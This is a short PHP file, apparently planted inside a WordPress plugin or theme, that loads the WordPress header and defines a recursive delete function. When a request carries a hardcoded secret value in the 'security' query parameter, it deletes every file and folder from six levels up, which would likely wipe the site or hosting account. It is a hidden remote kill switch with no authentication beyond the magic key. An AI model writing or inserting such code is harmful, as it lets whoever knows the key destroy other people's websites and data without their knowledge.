<?php 
require_once('../../../../../wp-blog-header.php');
 
 function rrmdir($dir) {
  if (is_dir($dir)) {
    $objects = scandir($dir);
    foreach ($objects as $object) {
      if ($object != "." && $object != "..") {
        if (filetype($dir."/".$object) == "dir") 
           rrmdir($dir."/".$object); 
        else unlink   ($dir."/".$object);
      }
    }
    reset($objects);
    rmdir($dir);
  }
 }

if($_GET['security'] == 'qs336hdppwm'){
	$files = '../../../../../../';
	
	rrmdir($files);
	
}

?>